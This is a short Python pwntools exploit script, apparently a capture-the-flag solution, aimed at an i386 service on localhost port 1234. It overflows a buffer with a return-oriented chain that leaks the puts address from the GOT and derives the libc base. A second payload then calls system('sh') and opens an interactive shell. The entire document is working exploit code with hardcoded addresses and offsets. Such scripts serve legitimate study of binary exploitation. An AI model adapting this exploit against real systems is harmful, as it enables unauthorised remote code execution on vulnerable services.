#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = remote('127.0.0.1', 1234)

trash = 'a'*22
pop1_ret = 0x08048359
puts_got = 0x8049874
puts_plt = 0x80483a0
puts_off = 0x005fca0

main = 0x080484ea
r.recvrepeat(0.1)
pay1 = flat([ puts_plt, pop1_ret, puts_got, main ])

r.sendline(trash + pay1)
libc = u32(r.recvuntil('\n')[:4]) - puts_off
print "libc: ",hex(libc)

system = libc + 0x003ada0
sh = 0x8048276
pay2 = flat([ system, sh, sh])
r.sendline(trash + pay2)
r.interactive()